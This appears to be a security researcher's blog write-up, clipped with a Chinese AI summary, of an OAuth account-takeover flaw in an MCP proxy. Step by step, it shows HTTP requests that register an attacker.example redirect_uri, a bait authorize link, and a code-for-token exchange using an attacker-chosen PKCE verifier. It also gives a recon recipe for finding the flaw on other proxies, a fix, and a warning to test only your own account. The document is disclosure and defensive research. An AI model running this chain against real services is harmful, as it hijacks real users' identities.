---
title: "Full Account Takeover on an MCP OAuth Proxy: Why PKCE Can't Save You"
source: https://hackt.us/full-account-takeover-on-an-mcp-oauth-proxy-why-pkce-can-t-save-you
source_host: hackt.us
clip_date: 2026-10-26T10:39:13+08:00
trace_id: 29f93ee2-5d4c-4725-9264-6ba62e54449f
content_hash: 894c93f76bd97de64beb1a43d381a3a2cc1a84fb79debdc610a234e37c8676bd
status: synced
tags:
  - 漏洞分析
  - 协议分析
series: null
feed_source: Hacktus·漏洞研究
ai_summary: MCP OAuth 代理因完全不校验动态注册的 redirect_uri，攻击者用一条真实域名的链接即可劫持受害者登录产生的授权码，换取真实 SSO 签发的长期 token，PKCE 对此无效。
ai_summary_style: key-points
images_status:
  total: 5
  succeeded: 5
  failed_urls: []
notion_page_id: 40575244-d011-818c-a5b5-e2b815a411b4
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> MCP OAuth 代理因完全不校验动态注册的 redirect_uri，攻击者用一条真实域名的链接即可劫持受害者登录产生的授权码，换取真实 SSO 签发的长期 token，PKCE 对此无效。
> 
> - **目标特征：** issuer 指向真实生产 SSO、`token_endpoint_auth_methods_supported` 为 `["none"]`（无 client_secret）、动态注册端点开放，三者叠加且代理仅靠 redirect_uri 列表区分注册。
> - **注册漏洞：** `POST /oauth/register` 接受任意 redirect_uri（如 attacker.example 返回 201）；且多次注册返回同一个固定 `client_id`，说明上游只有一个真实客户端，redirect_uri 校验是唯一防线。
> - **PKCE 失效原因：** 攻击者自己生成 verifier 并提交对应 challenge，受害者从未参与 OAuth 握手，只是“认证材料”；PKCE 只防第三方截码，不防注册者本人。
> - **攻击链：** 受害者点击指向真实域名的 authorize 链接 → 在真实 SSO 完成登录和 MFA → 授权码经代理 302 落到攻击者回调 → 用自选 verifier 换取 24 小时 access token 和 14 天 refresh token，可直接以受害者身份调用生产 userinfo。
> - **修复建议：** redirect_uri 白名单精确匹配，并在注册、授权、回调三处强制校验；否则 PKCE、state、nonce 等机制全是装饰。

TL;DR: Got an MCP OAuth proxy to hand me real production access tokens for any user who clicked one link. No fake login page. No cert warning. No MFA bypass. The victim actually signs in at the real SSO on the real domain with real MFA and that's exactly what makes the token real. The trick is the `/oauth/register` + `/oauth/authorize` + `/oauth/callback` triple: register an attacker redirect_uri, bait the victim through the proxy, the real SSO mints a code for them, and the proxy delivers it to the attacker. PKCE doesn't stop this because the attacker is the one picking the challenge. You register the verifier at exchange time and walk out with a 24-hour access token and a 14-day refresh token.

* * *

## Warm-up: the target shape

Skim this first:

```
GET /.well-known/oauth-authorization-server HTTP/1.1
Host: mcp.target.example
```

```json
{
  "issuer": "https://sso.target.example/",
  "authorization_endpoint": "https://mcp.target.example/oauth/authorize",
  "token_endpoint": "https://mcp.target.example/oauth/token",
  "registration_endpoint": "https://mcp.target.example/oauth/register",
  "token_endpoint_auth_methods_supported": ["none"],
  "code_challenge_methods_supported": ["S256"]
}
```

If I'm hunting on OAuth, this is the shape I'm looking for. Three things together make it interesting:

-   The `issuer` points at a real production SSO. Tokens that come out of this proxy are real tokens.
    
-   `token_endpoint_auth_methods_supported: ["none"]` means no client_secret. PKCE is the only thing gating `/oauth/token`.
    
-   `registration_endpoint` is live. Dynamic Client Registration is on, which is how MCP clients like Claude Desktop bootstrap themselves.
    

None of those individually is a bug. The question is whether the proxy treats the redirect_uri like a keystone or like a suggestion.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/1923cc309ab7e725.png)

## Step 1 - register whatever redirect_uri you want

```bash
POST /oauth/register HTTP/1.1
Host: mcp.target.example
Content-Type: application/json

{
  "client_name": "hacktus",
  "redirect_uris": ["https://attacker.example/callback"],
  "token_endpoint_auth_method": "none",
  "grant_types": ["authorization_code"]
}
```

```json
{
  "redirect_uris": ["https://attacker.example/callback"],
  "client_id": "dx_target_mcp_client",
  "client_name": "hacktus"
}
```

201 `attacker.example` accepted. Obvious first-order bug.

But look at the `client_id`. I registered with a unique `client_name`, got back a generic `client_id` that doesn't correspond to me. Register again with different values - same `client_id` comes back. The proxy isn't actually creating OAuth clients upstream. It has one fixed client on the real SSO and it's storing redirect_uris behind it.

That matters for two reasons. First, the `/oauth/authorize` flow is going to use that fixed `client_id` upstream, which means the SSO sees all registrations as the same client - no way for the SSO to tell my registration apart from a legitimate one. Second, if the proxy's only per-registration state is the redirect_uri list, then redirect_uri validation is the only protection between me and other users' tokens.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/b7acd4087b58eb68.png)

## Step 2 - the PKCE gotcha

Quick refresher because this is where most people go wrong. PKCE is supposed to stop authorization code theft. Client generates a random verifier, SHA256s it, sends the hash (the challenge) with the authorize request, keeps the verifier in memory. If someone else grabs the code off the URL, they don't have the verifier and can't exchange it.

That's the full threat model. Someone on the same device intercepts the URL, tries to trade a code they shouldn't have, fails because no verifier.

Now read that again with the attacker in the client seat.

```toml
verifier = "hacktus_bbp_verifier_2026"
challenge = base64url(sha256(verifier)).replace(/=+$/, "")
```

I pick the verifier. I hash it myself. I send the hash in the authorize request. When the code eventually comes back to my redirect_uri, I present the verifier I wrote down. The hash matches because I'm the one who generated both sides.

PKCE is not bypassed. PKCE is not broken. It works exactly like the RFC says. It's just not defending anyone in this flow because the "interceptor" and the "client" are the same entity. The victim never touches the challenge, the verifier, or the code. They're the authentication material, not a participant in the OAuth handshake.

If you ever read "PKCE makes public clients safe" in a blog post, this is what's missing: PKCE protects *clients*. If the threat is that a user gets phished into performing an authorize step for the attacker's client, PKCE has nothing to say.

## Step 3 - the bait link

Just one URL. No phishing page. No lookalike domain. No cert trick.

```
https://mcp.target.example/oauth/authorize
  ?response_type=code
  &client_id=dx_target_mcp_client
  &redirect_uri=https%3A%2F%2Fattacker.example%2Fcallback
  &scope=openid+profile
  &state=abc
  &code_challenge=<sha256-of-my-verifier>
  &code_challenge_method=S256
```

The victim clicks. They hit `mcp.target.example` - the real vendor's production hostname. The proxy reads the query string, stashes the redirect_uri in its pending-authorization state, and 302s them to `https://sso.target.example/authorize/v3?...` - the real production SSO.

From the victim's browser: real domain, real cert, real SSO they log into every day, real MFA prompt if they have it on. The SSO has no way to know this authorize was initiated on behalf of anyone shady, because from its perspective the request came from `dx_target_mcp_client`, its legitimate registered MCP client, via the proxy it always talks to.

They sign in. The SSO mints an authorization code for their account, 302s back to the proxy's `/oauth/callback`. The proxy looks up the pending authorization, finds the redirect_uri I registered, and redirects there:

```
302 Found
Location: https://attacker.example/callback?code=<JWT>&state=abc
```

That's the whole theft. The code lands at my endpoint because the proxy never re-checked whether `attacker.example` was supposed to be receiving anything.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/016d249b37edb9cb.png)

## Step 4 - cash out

```
POST /oauth/token HTTP/1.1
Host: mcp.target.example
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code
&client_id=dx_target_mcp_client
&code_verifier=hacktus_bbp_verifier_2026
&redirect_uri=https%3A%2F%2Fattacker.example%2Fcallback
&code=<captured_code>
```

```json
{
  "access_token": "<JWT signed by production SSO>",
  "token_type": "bearer",
  "expires_in": 86399,
  "refresh_token": "<JWT signed by production SSO>"
}
```

`expires_in: 86399` - 24-hour access token. The refresh token is signed the same way and lives for two weeks. Both signed by the production SSO's actual signing key. The proxy didn't fork the signing chain, it's a pure translator.

PKCE check passes - I'm handing in the verifier I generated in Step 2, the same one whose SHA-256 I sent as the challenge. The token endpoint has no idea this code came from a victim's login session rather than mine. It sees matching verifier/challenge, authorized client_id, valid code, calls it good.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/200933308da2b94b.png)

## Step 5 - proof it's really them

```
GET /userinfo HTTP/1.1
Host: sso.target.example
Authorization: Bearer <stolen_access_token>
```

```json
{
  "sub": "<victim_user_id>",
  "name": "<victim name>",
  "given_name": "<victim given name>",
  "family_name": "<victim family name>"
}
```

That's someone else's identity. Token works against the production SSO userinfo endpoint. Anywhere in the vendor's ecosystem that trusts this SSO, I am now that user for 24 hours, renewable for two weeks.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/f73322e4ed58ad7b.png)

## What actually broke

Three things line up:

1.  **Registration is a free-for-all.** `/oauth/register` accepts any redirect_uri. No allowlist, no review, no verification.
    
2.  **Callback trusts the stored redirect_uri.** Whatever I registered is where codes get delivered, no re-validation against a known-good list.
    
3.  **Token endpoint has no client auth.** PKCE is load-bearing, and PKCE doesn't help against the registrant themselves.
    

The vendor's fix was not subtle: hard-coded allowlist of legitimate MCP client redirect_uri patterns, checked at register, authorize, and callback time. PKCE stayed the same - it's still doing its real job (code interception by third parties), it's just no longer the only thing in the way.

## Spotting this on other MCP proxies

If you want to find this pattern elsewhere, the reconnaissance is dumb simple:

1.  `GET /.well-known/oauth-authorization-server` on any OAuth proxy you find. If it advertises a registration endpoint, `token_endpoint_auth_methods_supported: ["none"]`, and an issuer pointing at a real production SSO, it has the right shape.
    
2.  `POST /oauth/register` with a redirect_uri on a domain you own. 201 with your URL echoed back = registration is unguarded.
    
3.  Build an authorize URL with that redirect_uri. If the proxy 302s to the real SSO without complaining, authorize-time validation is missing too.
    
4.  Complete the login with your own test account. If your own code lands at your endpoint, the bug is real.
    

Do not run step 4 against a different user. The point of the research is the architecture, not anyone's identity. Your own test account is enough to prove the whole chain.

The fingerprint travels well. I'd expect variations of this to show up in a lot of early MCP OAuth proxies as more vendors ship them in front of existing SSO. The spec technically lets you do everything the way this proxy did. The spec does not require you to keep redirect_uri validation, but if you skip it, this is what happens.

## Closing tip

If you're building one of these: redirect_uri allowlist, exact match, enforced at register/authorize/callback, and reviewed like production code. Everything else in OAuth 2.1 assumes you've done that. PKCE, `state`, nonce, short code lifetimes - all of it is downstream of a correct redirect_uri allowlist. Get that one wrong and the rest is decoration.
